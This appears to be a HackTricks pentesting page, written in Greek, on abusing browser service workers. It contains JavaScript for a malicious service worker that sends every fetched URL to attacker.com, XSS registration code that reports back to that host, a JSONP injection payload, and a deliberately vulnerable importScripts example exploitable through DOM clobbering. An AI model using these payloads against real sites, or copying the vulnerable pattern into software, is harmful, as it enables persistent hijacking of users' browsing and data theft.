# Κατάχρηση Υπηρεσιών Εργασίας

{{#include ../../banners/hacktricks-training.md}}

## Βασικές Πληροφορίες

Ένας **εργάτης υπηρεσίας** είναι ένα σενάριο που εκτελείται από τον περιηγητή σας στο παρασκήνιο, ξεχωριστά από οποιαδήποτε ιστοσελίδα, επιτρέποντας δυνατότητες που δεν απαιτούν μια ιστοσελίδα ή αλληλεπίδραση χρήστη, ενισχύοντας έτσι τις δυνατότητες **εκτός σύνδεσης και επεξεργασίας στο παρασκήνιο**. Λεπτομερείς πληροφορίες σχετικά με τους εργάτες υπηρεσίας μπορείτε να βρείτε [εδώ](https://developers.google.com/web/fundamentals/primers/service-workers). Εκμεταλλευόμενοι τους εργάτες υπηρεσίας μέσα σε έναν ευάλωτο διαδικτυακό τομέα, οι επιτιθέμενοι μπορούν να αποκτήσουν έλεγχο στις αλληλεπιδράσεις του θύματος με όλες τις σελίδες εντός αυτού του τομέα.

### Έλεγχος Υπαρχόντων Εργατών Υπηρεσίας

Οι υπάρχοντες εργάτες υπηρεσίας μπορούν να ελεγχθούν στην ενότητα **Εργάτες Υπηρεσίας** της καρτέλας **Εφαρμογή** στα **Εργαλεία Ανάπτυξης**. Μια άλλη μέθοδος είναι η επίσκεψη στο [chrome://serviceworker-internals](https://chromium.googlesource.com/chromium/src/+/main/docs/security/chrome%3A/serviceworker-internals) για μια πιο λεπτομερή προβολή.

### Ειδοποιήσεις Push

Οι **άδειες ειδοποιήσεων push** επηρεάζουν άμεσα την ικανότητα ενός **εργάτη υπηρεσίας** να επικοινωνεί με τον διακομιστή χωρίς άμεση αλληλεπίδραση χρήστη. Εάν οι άδειες απορριφθούν, περιορίζει την ικανότητα του εργάτη υπηρεσίας να θέτει μια συνεχόμενη απειλή. Αντίθετα, η χορήγηση αδειών αυξάνει τους κινδύνους ασφαλείας επιτρέποντας την παραλαβή και εκτέλεση πιθανών εκμεταλλεύσεων.

## Επίθεση Δημιουργίας Εργάτη Υπηρεσίας

Για να εκμεταλλευτείτε αυτήν την ευπάθεια, πρέπει να βρείτε:

- Έναν τρόπο να **ανεβάσετε αυθαίρετα αρχεία JS** στον διακομιστή και μια **XSS για να φορτώσετε τον εργάτη υπηρεσίας** του ανεβασμένου αρχείου JS
- Ένα **ευάλωτο αίτημα JSONP** όπου μπορείτε να **χειριστείτε την έξοδο (με αυθαίρετο κώδικα JS)** και μια **XSS** για να **φορτώσετε το JSONP με ένα payload** που θα **φορτώσει έναν κακόβουλο εργάτη υπηρεσίας**.

Στο παρακάτω παράδειγμα θα παρουσιάσω έναν κώδικα για να **καταχωρήσετε έναν νέο εργάτη υπηρεσίας** που θα ακούει το γεγονός `fetch` και θα **στέλνει στον διακομιστή των επιτιθέμενων κάθε URL που ανακτάται** (αυτός είναι ο κώδικας που θα χρειαστεί να **ανεβάσετε** στον **διακομιστή** ή να φορτώσετε μέσω μιας **ευάλωτης JSONP** απάντησης):
```javascript
self.addEventListener('fetch', function(e) {
e.respondWith(caches.match(e.request).then(function(response) {
fetch('https://attacker.com/fetch_url/' + e.request.url)
});
```
Και αυτός είναι ο κώδικας που θα **καταχωρήσει τον εργαζόμενο** (ο κώδικας που θα πρέπει να είστε σε θέση να εκτελέσετε εκμεταλλευόμενοι μια **XSS**). Σε αυτή την περίπτωση, θα σταλεί ένα **GET** αίτημα στον διακομιστή των **επιτιθέμενων** **γνωστοποιώντας** αν η **καταχώρηση** του εργαζομένου υπηρεσίας ήταν επιτυχής ή όχι:
```javascript
<script>
window.addEventListener('load', function() {
var sw = "/uploaded/ws_js.js";
navigator.serviceWorker.register(sw, {scope: '/'})
.then(function(registration) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/success", true);
xhttp2.send();
}, function (err) {
var xhttp2 = new XMLHttpRequest();
xhttp2.open("GET", "https://attacker.com/SW/error", true);
xhttp2.send();
});
});
</script>
```
Σε περίπτωση κατάχρησης ενός ευάλωτου JSONP endpoint, θα πρέπει να βάλετε την τιμή μέσα στο `var sw`. Για παράδειγμα:
```javascript
var sw =
"/jsonp?callback=onfetch=function(e){ e.respondWith(caches.match(e.request).then(function(response){ fetch('https://attacker.com/fetch_url/' + e.request.url) }) )}//"
```
Υπάρχει ένα **C2** αφιερωμένο στην **εκμετάλλευση των Service Workers** που ονομάζεται [**Shadow Workers**](https://shadow-workers.github.io) το οποίο θα είναι πολύ χρήσιμο για την εκμετάλλευση αυτών των ευπαθειών.

Η **κατεύθυνση cache 24 ωρών** περιορίζει τη διάρκεια ζωής ενός κακόβουλου ή συμβιβασμένου **service worker (SW)** σε το πολύ 24 ώρες μετά την επιδιόρθωση μιας ευπάθειας XSS, υποθέτοντας την κατάσταση online του πελάτη. Για να ελαχιστοποιήσουν την ευπάθεια, οι διαχειριστές ιστότοπων μπορούν να μειώσουν τον Χρόνο Ζωής (TTL) του script SW. Συνιστάται επίσης στους προγραμματιστές να δημιουργήσουν ένα [**service worker kill-switch**](https://stackoverflow.com/questions/33986976/how-can-i-remove-a-buggy-service-worker-or-implement-a-kill-switch/38980776#38980776) για γρήγορη απενεργοποίηση.

## Εκμετάλλευση του `importScripts` σε ένα SW μέσω DOM Clobbering

Η συνάρτηση **`importScripts`** που καλείται από έναν Service Worker μπορεί να **εισάγει ένα script από διαφορετικό τομέα**. Εάν αυτή η συνάρτηση κληθεί χρησιμοποιώντας μια **παράμετρο που θα μπορούσε να** τροποποιήσει ένας επιτιθέμενος, θα μπορούσε να **εισάγει ένα JS script από τον τομέα του** και να αποκτήσει XSS.

**Αυτό παρακάμπτει ακόμη και τις προστασίες CSP.**

**Παράδειγμα ευάλωτου κώδικα:**

- **index.html**
```html
<script>
navigator.serviceWorker.register(
"/dom-invader/testcases/augmented-dom-import-scripts/sw.js" +
location.search
)
// attacker controls location.search
</script>
```
- **sw.js**
```javascript
const searchParams = new URLSearchParams(location.search)
let host = searchParams.get("host")
self.importScripts(host + "/sw_extra.js")
//host can be controllable by an attacker
```
### Με DOM Clobbering

Για περισσότερες πληροφορίες σχετικά με το τι είναι το DOM Clobbering, ελέγξτε:

{{#ref}}
dom-clobbering.md
{{#endref}}

Εάν το URL/domain που χρησιμοποιεί το SW για να καλέσει **`importScripts`** είναι **μέσα σε ένα HTML στοιχείο**, είναι **δυνατό να το τροποποιήσετε μέσω του DOM Clobbering** για να κάνετε το SW **να φορτώσει ένα σενάριο από το δικό σας domain**.

Για ένα παράδειγμα αυτού, ελέγξτε τον σύνδεσμο αναφοράς.

## Αναφορές

- [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)

{{#include ../../banners/hacktricks-training.md}}
